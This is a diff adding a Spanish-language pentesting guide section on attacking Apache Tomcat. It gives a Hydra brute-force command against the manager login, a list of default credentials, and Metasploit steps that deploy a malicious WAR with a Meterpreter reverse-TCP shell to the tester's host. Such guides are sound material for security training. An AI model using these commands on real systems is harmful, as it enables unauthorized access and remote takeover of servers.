@@ -88,3 +88,51 @@ run
 
 ✔ USER_FILE y PASS_FILE → Diccionarios de usuario y contraseña.
 
+
+## Ataque de Fuerza Bruta con Hydra💥
+
+Si encontramos el panel de login de Tomcat, podemos probar credenciales con Hydra:
+
+```bash
+hydra -L <usernames_wordlists.txt> -P <password_wordlist.txt> <url> http-get /manager/html
+```
+
+💡 Explicación: 
+
+✔ -L → Lista de usuarios.
+
+✔ -P → Diccionario de contraseñas.
+
+✔ http-get /manager/html → Ataca el login de Tomcat.
+
+Credenciales por defecto de Tomcat:
+
+- admin:admin
+
+- tomcat:tomcat
+
+- tomcat:s3cret
+
+- root:root
+
+## Subida de War Malicioso con Metasploit
+
+Si tenemos credenciales válidas en el Manager, podemos subir un archivo .war para obtener acceso remoto.
+
+```bash
+use exploit/multi/http/tomcat_mgr_deploy 
+set RHOSTS <url>
+set HTTPUSERNAME <usuario> 
+set HTTPPASSWORD <contraseña> 
+set PAYLOAD java/meterpreter/reverse_tcp 
+set LHOST <tu_ip> 
+set LPORT 4444 
+exploit
+```
+
+---
+
+<div style="text-align:center; font-size: 0.9em; margint-top: 40px; color: #33ff33;">
+    💻 Hecho con 💚 por <strong>Marcela</strong> - 2025
+</div>
+
